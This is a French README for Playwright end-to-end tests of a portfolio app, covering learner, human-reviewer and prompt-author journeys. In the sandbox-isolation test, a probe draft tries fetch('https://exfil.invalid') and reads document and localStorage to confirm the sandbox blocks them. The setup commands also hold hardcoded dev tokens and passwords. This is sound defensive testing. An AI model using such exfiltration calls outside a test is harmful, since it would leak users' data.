# Tests bout-en-bout (Playwright) — parcours apprenant (P8), cartographe (P9), promptologue (P10)

**Local uniquement.** Playwright et le navigateur Chromium sont des outils de
poste de développement : rien de tout ceci n'est déployé ni exécutable sur
l'hébergement OVH (pas de Node serveur, ADR-003).

## Ce qui est testé

Un seul scénario séquentiel, `web/e2e/parcours-apprenant.e2e.js` — LE parcours
cœur du MVP (plan-prompts P8, cahier §3.2/§3.6/§6), chaque étape étant un
`test.step` nommé en français :

1. Création de compte (email unique par run : rejouable sans nettoyage).
2. Création d'un portfolio : collage de la fixture
   `schemas/fixtures/portfolio-3-jours.md`, segmentation automatique vérifiée
   (3 journées datées 2026-01-05..07), sauvegarde locale (IndexedDB).
3. Assistant « Nouveau run » : portfolio → version de prompt par défaut
   (`aurora-v3-reconstruit@1.0.0`) → fournisseur « Service humanome »
   (proxy `/api/llm`, preuve de travail par appel) → estimation affichée.
4. Run complet : exactement **24 appels mock** comptés sur le réseau
   (3 journées × (7 pôles + 1 synthèse kairos)).
5. Les 4 cartographies (3 jours + 1 merge) apparaissent dans le tableau de
   bord ; ouverture de la visualisation (sunburst rendu).
6. Opt-in explicite « copie serveur » (RGPD §6.2), puis partage : lien +
   mot de passe (`partage-test-1`), expiration par défaut 90 jours.
7. Ouverture du lien dans un **contexte navigateur neuf** (équivalent
   navigation privée) : mauvais mot de passe refusé (403), bon mot de passe →
   document rendu en lecture seule.
8. Export de l'archive : téléchargement réel, puis **validation au schéma**
   `archive-export` par le moteur (`engine/src/validation.js`) dans le test.
9. Suppression du compte (confirmation par email) : purge réelle.
10. Après la purge, le lien de partage répond 404 (réponse homogène
    anti-énumération).

## Prérequis

1. **API docker avec le provider LLM mock** (aucune clé API nécessaire) :

   ```sh
   docker compose up -d          # php 8.2 + mysql 8, http://localhost:8080
   curl -s http://localhost:8080/api/health   # {"status":"ok",...,"db":"ok"}
   ```

   `docker-compose.override.yml` (auto-chargé, jamais déployé) fournit
   `DEMO_PROVIDER=mock` (réponses tirées de `schemas/fixtures/`) et remonte le
   quota `/api/llm` à 500/h/IP — le quota de production (20/h) bloquerait le
   run de 24 appels en plein milieu.

   Migrations à jour si la base est neuve :
   `curl -X POST -H 'X-Migrate-Token: dev_migrate_token' http://localhost:8080/api/admin/migrate`.

2. **Dépendances web + navigateur Playwright** (une fois) :

   ```sh
   cd web
   npm install                    # @playwright/test est en devDependency
   npx playwright install chromium
   ```

Le dev-server Vite (port 5173, proxy `/api` → :8080) est lancé et arrêté par
Playwright lui-même (`webServer` de `web/playwright.config.js`) ; s'il tourne
déjà, il est réutilisé.

## Commandes

```sh
cd web
npm run test:e2e               # toute la suite e2e (~30 s)
npx playwright test --headed  # avec fenêtre visible
npx playwright show-trace test-results/*/trace.zip  # trace d'un échec
```

`workers: 1` est imposé : le scénario partage l'état serveur (compte, quotas
IP) et l'état navigateur (IndexedDB) d'étape en étape.

## Choix d'implémentation

- **Suffixe `.e2e.js`** (et `testMatch` dédié dans `playwright.config.js`) :
  les motifs par défaut de vitest incluent `**/*.spec.js` — un suffixe propre
  évite que `npm test` (vitest, jsdom) ne ramasse les scénarios Playwright.
- **Timeout de test 420 s** : chaque appel `/api/llm` exige une preuve de
  travail de 20 bits (~1 s) ; le run mock complet se joue en pratique en
  ~20 s, mais la marge absorbe les machines lentes.
- La validation de l'archive importe directement
  `engine/src/validation.js` (validateurs précompilés, aucun ajv à charger) :
  le test utilise exactement le même validateur que l'application.

## Rejouabilité / limites connues

- Email de compte unique par run (`e2e-<timestamp>@humanome.test`) et compte
  supprimé en fin de scénario : la suite est rejouable sans nettoyage.
- `POST /api/auth/register` est limité à **10/h par IP** (P3) : au-delà de
  ~10 exécutions dans l'heure sur la même base dev, l'inscription répondra
  429. Remède dev : attendre, ou vider la table `rate_limits`
  (`docker compose exec mysql mysql -uhumanome -phumanome_dev humanome -e
  'TRUNCATE rate_limits;'`).
- Le run n'exécute que le pipeline embarqué (v1 assumée, P8.3) : le choix de
  version de prompt est tracé dans `runMeta`, l'exécution des paquets publiés
  arrive avec le banc promptologue (P10).

---

## M7 — parcours cartographe (P9) et promptologue (P10)

Deux scénarios séquentiels ajoutés en M7, mêmes prérequis (API docker + mock,
dev-server Vite lancé par Playwright, `workers: 1`).

### `web/e2e/parcours-cartographe.e2e.js` (DoD P9)

Le cartographe est le **garde-fou humain obligatoire** (cahier §3.3, §8) :
aucune cartographie n'est présentée comme validée sans signature humaine. Le
scénario traverse le contrat d'API M7 de bout en bout, dans **deux contextes
navigateur distincts** (l'apprenant et le cartographe sont deux personnes) :

1. **Apprenant** — compte, portfolio (fixture 3 jours), run mock complet
   (24 appels `/api/llm`), puis sur une cartographie de **journée** :
   confidentialité « partagée avec mon cartographe » + copie serveur (opt-in
   RGPD), puis émission d'un **code d'invitation** (10 car. A-Z2-9, 30 j) via
   `POST /api/cartographe/invitations` (session + CSRF, joué en `fetch` depuis
   la page — l'UI apprenant dédiée reste au backlog M7).
2. **Cartographe** (contexte séparé) — compte, **rôle attribué** par
   `POST /api/admin/grant-role` (jeton de déploiement, outillage pré-P12),
   acceptation de l'invitation (l'apprenant apparaît, la file se remplit),
   ouverture de la relecture, **annotation « hallucination »** sur une
   compétence, **correction du verdict** (statut « renvoi au cartographe »,
   motif sentinelle) → nouvelle **révision** visible dans l'historique →
   **« valider et garantir »** (signature horodatée, révision figée). La
   compétence corrigée est choisie dynamiquement (première « présence établie »
   du document réellement produit par le run mock, lue via l'API) : robuste aux
   variations du mock.
3. **Apprenant** — crée un lien de partage employeur (lien + mot de passe).
4. **Employeur** (contexte NEUF) — la page de partage affiche la mention
   **« garantie par Cartographe E2E »** ET le **verdict corrigé** : sélection
   au clavier du secteur de la compétence dans le sunburst, le panneau verdict
   montre « renvoi au cartographe » et le motif sentinelle — qui n'existent que
   dans la **révision garantie**. C'est la preuve que `POST /api/share/{token}`
   sert le document de la révision figée (§8), pas le document d'origine.

### `web/e2e/parcours-promptologue.e2e.js` (DoD P10)

Un prompt-package contient du **code JS arbitraire** exécuté chez les
utilisateurs : l'atelier et sa sandbox sont une pièce de sécurité (cahier §3.4,
`docs/securite-prompts.md`).

1. Compte + rôle `promptologue` (`grant-role`).
2. **Nouveau brouillon** depuis la dernière version publiée du paquet par
   défaut, modification du **texte d'un gabarit**, validation au schéma
   (client), enregistrement (`PUT drafts/{id}`).
3. **Publication** d'une version (semver strictement croissant, changelog,
   immuable).
4. **Diff structurel** vérifié au niveau **API** (`GET …/diff/{v1}/{v2}`,
   versions publiées uniquement). Le rendu UI du diff est désormais corrigé
   (voir la note ci-dessous) et couvert par un test de contrat partagé.
5. **Banc d'essai A/B** ancienne vs nouvelle version sur la fixture (mock) :
   rapport comparatif affiché (totaux, par journée, lien de téléchargement).
6. **Isolation sandbox** : un brouillon dont le code tente
   `fetch('https://exfil.invalid')`, l'accès à `document` et `localStorage`,
   est exécuté au banc. Assertions : le run **échoue proprement** en remontant
   les constats de la sonde (`fetch:bloque`, `document:undefined`,
   `localStorage:undefined`), et **aucune requête réseau ne sort** de la
   sandbox (`page.on('request')` filtré : seuls le dev-server, `data:` et
   `blob:` sont tolérés — les `blob:` sont les sources Worker/module créées par
   `URL.createObjectURL` dans l'iframe à origine opaque, jamais du réseau ;
   assertion dédiée « zéro requête vers `exfil.invalid` »).
7. **Boucle infinie** : `runPackageInSandbox` importé du dev-server (même code
   que l'app) avec le seam documenté `timeoutMs` réduit à 2 s ; le Worker qui
   ne rend jamais la main est **détruit par le timeout** (rejet « délai global
   dépassé », iframe retirée du DOM).

Le test focalisé `web/e2e/sandbox-isolation.e2e.js` (chantier P10.3) double
cette garantie d'isolation au niveau du `srcdoc`/Worker RÉEL, en incluant le
discriminant `fetch { mode: 'no-cors' }` (exfiltration par URL). Les deux
passent.

### Prérequis et rejouabilité spécifiques M7

- **`grant-role` et le CSRF** : `POST /api/admin/grant-role` est gardé par le
  jeton de déploiement (`X-Migrate-Token`) MAIS reste soumis au **CSRF global**
  (il n'est pas dans les exemptions de `docs/autorisations.md`). Joué depuis un
  navigateur porteur de session, il faut donc AUSSI `X-CSRF-Token` (lu sur
  `GET /api/auth/me`) — c'est ce que fait le helper `grantRole()` des specs. En
  déploiement (curl sans session) le CSRF ne s'applique pas, d'où l'usage
  historique sans jeton CSRF.
- **Semver rejouable** : les versions publiées sont immuables et strictement
  croissantes par paquet (et un semver de brouillon occupe aussi le créneau) ;
  le spec promptologue dérive donc ses versions de l'horloge
  (`1.<secondes-epoch>.0` puis `.1`) — uniques et croissantes d'un run à
  l'autre, sans nettoyage. Le paquet **par défaut** servi aux apprenants reste
  épinglé par la table `settings` : publier au banc ne change rien pour eux.
- **Budget LLM cumulé** : chaque run mock consomme les compteurs
  (`rate_limits`, `llm_usage_daily`). En rejouant intensivement les quatre
  scénarios dans la même heure/journée, on peut heurter le quota horaire
  `DEMO_PER_IP_PER_HOUR` (429) ou le **coupe-circuit journalier de tokens**
  (`DEMO_DAILY_GLOBAL_TOKENS`, 503). Remède dev : `TRUNCATE rate_limits,
  llm_usage_daily, llm_pow_challenges;` (comme pour `rate_limits` en P8).

### Note historique — diff UI promptologue (corrigé)

Un bug d'intégration avait été signalé ici : `DiffView` (`EditeurSection.jsx`)
attendait une forme **française** fictive (`ajoutes`/`retires`/`modifies`,
`from`/`to` en chaînes) alors que le serveur `PackageDiff.php` renvoie la forme
**anglaise réelle** (`added`/`removed`/`modified`, `from`/`to` en **objets**
`{version}`) — rendre `{diff.from}` (un objet) plantait React et vidait
l'atelier.

**Corrigé.** `DiffView` consomme désormais la forme RÉELLE du serveur, et une
**fixture partagée** (`schemas/fixtures/diff/prompt-package-diff-exemple.json`,
générée depuis la vraie sortie de `PackageDiff::compute`) est vérifiée des deux
côtés : `api/tests/PackagesDiffTest.php` fige la forme émise par le serveur
(`compute()` + la route HTTP), et `web/src/views/promptologue/DiffView.test.jsx`
la rend. Renommer une clé d'un côté casse le test de l'autre — le contrat ne
peut plus dériver en silence. Le spec e2e continue de vérifier le contrat au
niveau API (le rendu détaillé est couvert par le test de composant).
